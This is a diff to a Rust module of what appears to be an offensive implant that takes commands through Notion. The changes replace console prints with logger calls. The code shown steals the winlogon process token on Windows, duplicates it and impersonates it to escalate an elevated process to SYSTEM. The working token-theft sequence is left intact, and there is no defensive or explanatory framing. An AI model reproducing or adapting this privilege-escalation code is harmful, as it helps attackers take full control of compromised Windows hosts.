@@ -54,7 +54,7 @@ pub async fn handle(logger: &Logger) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         if is_elevated() {
             unsafe {
-                println!("[+] Elevated! Let's get that SYSTEM");
+                logger.info(log_out!("Elevated! Let's get that SYSTEM"));
     
                 let mut winlogon_token_handle = HANDLE(0);
                 let mut duplicate_token_handle = HANDLE(0);
@@ -63,27 +63,25 @@ pub async fn handle(logger: &Logger) -> Result<String, Box<dyn Error>> {
                     return notion_out!("Couldn't find winlogon!");
                 }
                 let winlogon_pid: u32 = winlogon_processes[0].0;
-                println!("[+] Winlogon pid: {:?}", winlogon_pid);
+                logger.debug(log_out!("Winlogon pid: ", winlogon_pid.to_string().as_str()));
                 // OpenProcess
                 let winlogon_proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon_pid);
-                println!("[+] Winlogon Proc Handle: {:?}", winlogon_proc_handle);
                 // OpenProcessToken
                 if OpenProcessToken(winlogon_proc_handle, TOKEN_DUPLICATE, &mut winlogon_token_handle).0 != 0 {
-                    println!("[+] Got Winlogon Token: {:?}", winlogon_token_handle);
                 } else {
                     return notion_out!("[!] Couldn't get Winlogon Token!");
                 }
                 // Duplicate Token
                 if DuplicateToken(winlogon_token_handle, SecurityImpersonation, &mut duplicate_token_handle).0 != 0 {
-                    println!("[+] Duplicated Token!");
+                    logger.debug(log_out!("Duplicated Token!"));
                 } else {
                     return notion_out!("[!] Couldn't duplicate token!");
                 }
                 // ImpersonateLoggedOnUser
                 if ImpersonateLoggedOnUser(duplicate_token_handle).0 != 0 {
-                    println!("[+] Impersonated!");
+                    logger.info(log_out!("Impersonated!"));
                     CloseHandle(winlogon_proc_handle);
-                    return notion_out!("[+] I am now ", whoami::username().as_str());
+                    return notion_out!("I am now ", whoami::username().as_str());
                 }
                 return notion_out!("Couldn't get system!");
                 // Close Handles
